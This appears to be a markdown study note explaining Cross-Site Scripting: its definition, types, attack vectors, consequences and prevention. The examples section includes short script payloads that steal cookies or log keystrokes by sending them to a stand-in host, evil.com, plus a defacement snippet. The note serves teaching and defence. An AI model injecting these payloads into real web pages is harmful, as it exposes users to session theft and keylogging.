# XSS

- XSS: Cross Site Scripting
- A type of code injection

## Definition

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts are executed in the context of the victim's browser, potentially compromising sensitive data or user accounts.

## Who Attacks Whom

- **Attacker:** Usually an external user or malicious insider who crafts input containing malicious JavaScript or HTML.
- **Victim:** End users who visit the vulnerable web page and unknowingly execute the injected script in their browser.
- **Target:** The web application and its users; attackers exploit weaknesses in the application to reach users.

## Examples of XSS Attacks

- **Stealing Cookies:**
  ```html
  <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
  ```
- **Session Hijacking:**
  Injecting scripts to capture session tokens and impersonate users.
- **Keylogging:**
  ```html
  <script>document.onkeypress=function(e){fetch('http://evil.com/log?key='+e.key)}</script>
  ```
- **Defacing Content:**
  ```html
  <script>document.body.innerHTML='Hacked!'</script>
  ```
- **Phishing:**
  Displaying fake login forms to steal credentials.

## How to Prevent

- **Input Validation:**
  - Validate and sanitize all user input on both client and server sides.
- **Output Encoding:**
  - Encode data before rendering it in HTML, JavaScript, or attributes.
- **Use Security Headers:**
  - Implement Content Security Policy (CSP) to restrict script execution.
  - Set HTTPOnly and Secure flags on cookies.
- **Avoid Dangerous Functions:**
  - Do not use `eval()`, `innerHTML`, or similar functions with untrusted data.
- **Use Trusted Libraries:**
  - Rely on frameworks and libraries that automatically escape output.
- **Regular Security Testing:**
  - Employ automated scanners and manual penetration testing to detect vulnerabilities.
- **Educate Developers:**
  - Train developers on secure coding practices and common XSS pitfalls.

## Take Look

A xss happenned when convert markdown to html

```md
this is a regular paragraph

<table>
  <tr>
    <td>Foo</td>
  </tr>
</table>

// milicious paragraph
<script>alert('hi')</script>
```

## Method To Mitigate It

XSS filter

---

## Types of XSS

- Stored XSS: Malicious script is permanently stored on the target server (e.g., in a database) and served to users.
- Reflected XSS: Malicious script is reflected off the web server, e.g., via a URL or form submission, and executed in the user's browser.
- DOM-based XSS: The vulnerability exists in client-side code, where the DOM is modified insecurely using user input.

## Attack Vectors:

- User input fields (comments, forms, search boxes)
- URL parameters
- Cookies
- HTTP headers
- Third-party integrations

## Consequences:

- Theft of session cookies and user credentials
- Account hijacking
- Defacement of websites
- Phishing attacks
- Malware distribution

## Common Mistakes:

- Failing to sanitize user input
- Directly inserting user input into HTML, JavaScript, or attributes
- Inadequate use of Content Security Policy (CSP)
- Not escaping output in templates

## Mitigation Strategies:

- Always sanitize and validate user input on both client and server sides
- Use secure frameworks and libraries that auto-escape output
- Implement Content Security Policy (CSP) headers
- Avoid using `eval()` and similar functions
- Encode data before inserting into HTML, JavaScript, or attributes
- Use HTTPOnly and Secure flags for cookies
- Regularly update dependencies to patch known vulnerabilities

## Testing and Detection:

- Use automated security scanners
- Perform manual penetration testing
- Review code for unsafe DOM manipulations
- Monitor logs for suspicious activity

---

